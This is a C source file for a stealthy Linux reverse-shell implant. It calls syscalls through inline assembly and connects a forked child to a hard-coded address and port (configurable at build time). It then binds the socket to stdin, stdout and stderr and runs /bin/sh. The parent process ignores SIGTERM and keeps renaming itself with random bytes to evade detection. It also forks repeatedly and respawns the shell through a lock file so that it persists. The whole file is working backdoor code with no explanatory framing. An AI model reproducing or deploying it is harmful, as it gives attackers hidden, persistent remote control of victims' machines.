#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <string.h>
#include <setjmp.h>
#include <signal.h>
#include <sys/stat.h>
#include <stdint.h> 
#include <syscall.h>
#include <bits/sigaction.h>

#ifdef DEBUG
#define DEBUG_PRINT(fmt, ...) printf(fmt, ##__VA_ARGS__)
#else
#define DEBUG_PRINT(fmt, ...)
#endif

#ifndef SOCKET_VAL
#define SOCKET_VAL 0x0100007f5c110002
#endif

#ifdef DEBUG
#define CHECK_ERR(func, msg) \
    do { \
        int ret = (func); \
        if (ret < 0) { \
            perror(msg); \
        } \
    } while(0)
#else
#define CHECK_ERR(func, msg) func
#endif

#define __do_syscall0(NUM) ({			\
	intptr_t rax;				\
						\
	__asm__ volatile(			\
		"syscall"			\
		: "=a"(rax)	/* %rax */	\
		: "a"(NUM)	/* %rax */	\
		: "rcx", "r11", "memory"	\
	);					\
	rax;					\
})

#define __do_syscall1(NUM, ARG1) ({		\
	intptr_t rax;				\
						\
	__asm__ volatile(			\
		"syscall"			\
		: "=a"(rax)	/* %rax */	\
		: "a"((NUM)),	/* %rax */	\
		  "D"((ARG1))	/* %rdi */	\
		: "rcx", "r11", "memory"	\
	);					\
	rax;					\
})

#define __do_syscall2(NUM, ARG1, ARG2) ({	\
	intptr_t rax;				\
						\
	__asm__ volatile(			\
		"syscall"			\
		: "=a"(rax)	/* %rax */	\
		: "a"((NUM)),	/* %rax */	\
		  "D"((ARG1)),	/* %rdi */	\
		  "S"((ARG2))	/* %rsi */	\
		: "rcx", "r11", "memory"	\
	);					\
	rax;					\
})

#define __do_syscall3(NUM, ARG1, ARG2, ARG3) ({	\
	intptr_t rax;				\
						\
	__asm__ volatile(			\
		"syscall"			\
		: "=a"(rax)	/* %rax */	\
		: "a"((NUM)),	/* %rax */	\
		  "D"((ARG1)),	/* %rdi */	\
		  "S"((ARG2)),	/* %rsi */	\
		  "d"((ARG3))	/* %rdx */	\
		: "rcx", "r11", "memory"	\
	);					\
	rax;					\
})

#define __do_syscall4(NUM, ARG1, ARG2, ARG3, ARG4) ({			\
	intptr_t rax;							\
	register __typeof__(ARG4) __r10 __asm__("r10") = (ARG4);	\
									\
	__asm__ volatile(						\
		"syscall"						\
		: "=a"(rax)	/* %rax */				\
		: "a"((NUM)),	/* %rax */				\
		  "D"((ARG1)),	/* %rdi */				\
		  "S"((ARG2)),	/* %rsi */				\
		  "d"((ARG3)),	/* %rdx */				\
		  "r"(__r10)	/* %r10 */				\
		: "rcx", "r11", "memory"				\
	);								\
	rax;								\
})

#define __do_syscall5(NUM, ARG1, ARG2, ARG3, ARG4, ARG5) ({		\
	intptr_t rax;							\
	register __typeof__(ARG4) __r10 __asm__("r10") = (ARG4);	\
	register __typeof__(ARG5) __r8 __asm__("r8") = (ARG5);		\
									\
	__asm__ volatile(						\
		"syscall"						\
		: "=a"(rax)	/* %rax */				\
		: "a"((NUM)),	/* %rax */				\
		  "D"((ARG1)),	/* %rdi */				\
		  "S"((ARG2)),	/* %rsi */				\
		  "d"((ARG3)),	/* %rdx */				\
		  "r"(__r10),	/* %r10 */				\
		  "r"(__r8)	/* %r8 */				\
		: "rcx", "r11", "memory"				\
	);								\
	rax;								\
})

int do_sleep(int sec) {
    struct timespec req = {0}, rem = {0};
    req.tv_sec = sec;

    return __do_syscall2(SYS_nanosleep, &req, &rem);
}

int set_file(int fd, int cmd, int lock_or_unlock) {
    struct flock fl;
    fl.l_type = lock_or_unlock;   // 写锁
    fl.l_whence = SEEK_SET;
    fl.l_start = 0;        // 文件开头
    fl.l_len = 0;          // 锁定整个文件

    return __do_syscall3(SYS_fcntl, fd, cmd, &fl);
}

int set_signal_handler(int signum) {
    struct sigaction act;
    for (int i = 0; i < sizeof(struct sigaction)/8; i++){
        *(((unsigned long long*)&act)+i) = 0; 
    }
    act.sa_handler = SIG_IGN;

    int num = __do_syscall4(SYS_rt_sigaction, signum, &act, NULL, sizeof(unsigned long));


    return 0;
}


#ifdef DEBUG
int main(int argc, char **argv) {
#else
int _start() {
	char *argv0;
    asm ("movq 16(%%rbp), %0" : "=r"(argv0)); // 将 RBP+0x8 处的值赋给 a
#endif
	char tmp_file[] = "/tmp/lock\x00";  
	char rand_file[] = "/dev/random\x00"; 
	int fd = __do_syscall3(SYS_open , tmp_file, O_CREAT | O_RDWR, 0666);
	int rand_fd = __do_syscall3(SYS_open, rand_file, O_RDONLY, 0666);
	set_signal_handler(SIGTERM);
		

    do { 
        pid_t pid = __do_syscall0(SYS_fork);

        if (pid == 0) {
			char sh_path[] = "/bin/sh\x00";
			__do_syscall0(SYS_setsid);

			DEBUG_PRINT("[*] child beginning...\n");

            CHECK_ERR(set_file(fd, F_SETLKW, F_WRLCK), "get lock from child");

            int sock = __do_syscall3(SYS_socket, AF_INET, SOCK_STREAM, 0);

            struct sockaddr addr;
            *(unsigned long long*)&addr = SOCKET_VAL;

            __do_syscall3(SYS_connect, sock, &addr, 16);

            for (int i = 0; i < 3; i++) {
                __do_syscall2(SYS_dup2, sock, i);
            }
            CHECK_ERR(__do_syscall3(SYS_execve, sh_path, NULL, (char *)NULL), "execve");

			__do_syscall1(SYS_exit, 0);

        } else {
            int file_state = 0;

            CHECK_ERR(do_sleep(3), "sleep");
			DEBUG_PRINT("[*] parent begin to loop\n");

            while (1) {
                char name[7] = {0};
                // change the process name
                __do_syscall3(SYS_read, rand_fd, name, 6);
                for (int i = 0; i < 7; i++)
				#ifdef DEBUG
                    argv[0][i] = name[i];
				#else
					argv0[i] = name[i];
				#endif
                
                __do_syscall2(SYS_prctl, PR_SET_NAME, name);

                if ( (file_state = set_file(fd, F_SETLK, F_WRLCK)) == 0 ) {
					// DEBUG_PRINT("[*] parent got lock\n");
					set_file(fd, F_SETLK, F_UNLCK);
                    break;
                }
                
                pid_t pid = __do_syscall0(SYS_fork);   

                if (pid > 0) {
                    do_sleep(5);
                    __do_syscall1(SYS_exit, 0);
                }
				__do_syscall0(SYS_setsid);
                do_sleep(1);
            }
        }
    } while (1);
	
}